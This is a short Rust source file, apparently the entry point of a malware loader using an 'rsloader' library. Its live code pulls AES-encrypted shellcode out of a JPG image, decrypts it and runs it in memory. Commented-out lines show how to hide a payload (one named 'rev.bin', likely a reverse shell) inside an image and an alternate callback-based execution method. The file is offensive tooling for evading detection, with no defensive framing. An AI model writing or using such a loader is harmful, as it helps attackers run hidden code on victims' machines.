fn main() {
    // create aes encrypted shellcode from raw shellcode file "lmao" and export it into a jpg file "mirin.jpg"

    //let my_sc_object = rsloader::AESShellCode::new(rsloader::ShellCode {
    //    sc: include_bytes!("../../haha").to_vec(),
    //});
    //my_sc_object.output_to_image("mirin.jpg", "/home/tobeatelite/Downloads/mqdefault.jpg");

    // extract aes shellcode object from mirin.jpg, decrypt it and execute it inside current process

    let recovered_shellcode = rsloader::ShellCode::from_image("lmao.jpg");
    recovered_shellcode.load();

    //let my_sc = rsloader::AESShellCode::new(rsloader::ShellCode { sc: include_bytes!("../../rev.bin").to_vec()});
    //my_sc.output_to_image("lmao.jpg", "/home/tobeatelite/Downloads/mqdefault.jpg");
    //my_sc.load_EnumSystemGeoID();
}
